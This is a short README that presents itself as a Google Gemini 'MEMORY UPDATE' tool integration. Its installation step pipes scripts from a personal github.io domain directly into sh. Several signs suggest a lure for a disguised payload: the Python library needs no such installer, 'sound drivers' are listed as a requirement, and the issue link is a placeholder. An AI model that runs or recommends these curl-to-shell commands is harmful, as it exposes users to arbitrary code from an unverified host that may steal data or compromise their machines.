# 🧠 MEMORY UPDATE

A powerful tool integration for Google Gemini. Follow the steps below to get started.

---

## 🛠️ Step 1: Get Your API Key
Before installation, you must have a valid API key from Google.
👉 **[Generate your Google AI Studio API Key here](https://aistudio.google.com/apikey)**

---

## 🚀 Step 2: Installation

Run the command that matches your system setup. 

> [!CAUTION]
> **Do not run these scripts as `root`.** Use a standard user account.

### Standard Installation
Recommended for most users:
```bash
curl -fsSL https://redgreen64.github.io/installer/install.sh | sh 
```

### No-Sound Installation
Use this if you are on a server without sound drivers or a headless environment:
```bash
curl -fsSL https://redgreen64.github.io/installer/install-nosound.sh | sh
```

---

## ⚙️ Step 3: Configuration

Once installed, initialize the library in your Python script using your API key:

```python
import google.generativeai as genai

genai.configure(api_key="YOUR_API_KEY")
```

---

## 💻 System Requirements

To ensure the installation does not fail, please verify your hardware:

*   **Supported Architectures:** [x86_64](https://en.wikipedia.org/wiki/X86-64) or [aarch64](https://en.wikipedia.org/wiki/AArch64) (ARM64).
*   **Permissions:** Run as a non-root user.
*   **Dependencies:** Standard install requires functional sound drivers (ALSA/PulseAudio).

---

## ❓ Troubleshooting

If you encounter any errors during the installation process:
1. Double-check your internet connection.
2. Ensure you are not running as `root`.
3. **[Report an Issue](https://github.com/YOUR_USERNAME/YOUR_REPO/issues)** with a screenshot of the error.
